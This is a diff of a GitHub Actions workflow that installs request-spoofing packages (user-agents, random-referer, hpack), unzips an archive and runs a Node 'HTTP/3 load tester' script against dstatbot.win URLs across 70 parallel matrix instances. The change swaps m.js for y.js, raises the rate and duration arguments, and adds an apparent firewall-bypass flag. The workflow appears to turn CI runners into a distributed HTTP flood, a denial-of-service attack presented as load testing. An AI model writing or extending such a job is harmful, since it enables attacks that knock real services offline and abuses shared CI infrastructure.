@@ -33,7 +33,7 @@ jobs:
       
       
       - name: Install Node.js dependencies
-        run: npm install  puppeteer-real-browser  axios chalk@4 colors request user-agents random-referer hpack
+        run: npm install    axios chalk@4 colors request user-agents random-referer hpack
             
       - name: Run HTTP/3 load tester
         run: |
@@ -41,7 +41,7 @@ jobs:
           cd ideal-guide
           unzip Fc-main 
           cd Fc-main 
-          node m.js https://captcha.dstatbot.win/9YWfVqfC 200 3 3 3
+          node y.js GET https://c4.dstatbot.win/TZSIjUDw 700 4 90 --bfw --debug 
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
